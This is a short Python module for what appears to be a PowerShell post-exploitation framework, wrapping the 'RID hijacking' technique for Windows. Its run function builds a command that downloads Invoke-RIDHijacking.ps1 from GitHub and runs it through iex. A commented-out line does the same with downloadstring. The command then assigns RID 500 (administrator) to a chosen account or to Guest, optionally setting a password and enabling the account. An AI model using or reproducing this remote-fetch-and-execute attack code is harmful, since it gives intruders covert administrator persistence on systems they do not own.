from pathlib import Path

from termcolor import colored, cprint

from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "RID hijacking",
                       "Description": "Runs Invoke-RIDHijacking. Allows setting desired privileges to an existent account"
                                      " by modifying the Relative Identifier value copy used to create the primary access token." 
                                      " This module needs administrative privileges.",
                       "Author": "Sebastian Castro @r4wd3r",
                       "Link": "https://github.com/r4wd3r/RID-Hijacking",
                       "License": "BSD 3-Clause",
                       "Module": "@r4wd3r"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "RID": ["500", "RID to set to the specified account. Default 500.", True],
                   "user": [None, "User to set the defined RID.", False],
                   "useguest": [None, "Set the defined RID to the Guest account.", False],
                   "password": [None, "Password to set to the defined account.", False],
                   "enable": [None, "Enable the defined account.", False]
                   }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = '(make_request -URL https://raw.githubusercontent.com/r4wd3r/RID-Hijacking/master/Invoke-RIDHijacking.ps1) | iex'
        #function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/r4wd3r/RID-Hijacking/master/Invoke-RIDHijacking.ps1');"
        function += 'Invoke-RIDHijacking -RID {}'.format(self.args["RID"])

        if self.args["user"]:
            function += ' -User {}'.format(self.args["user"])

        if self.args["password"]:
            function += ' -Password {}'.format(self.args["password"])

        if str(self.args["useguest"]).lower() == 'true':
            function += ' -UseGuest'

        if str(self.args["enable"]).lower() == 'true':
            function += ' -Enable'

        super(CustomModule, self).run(function)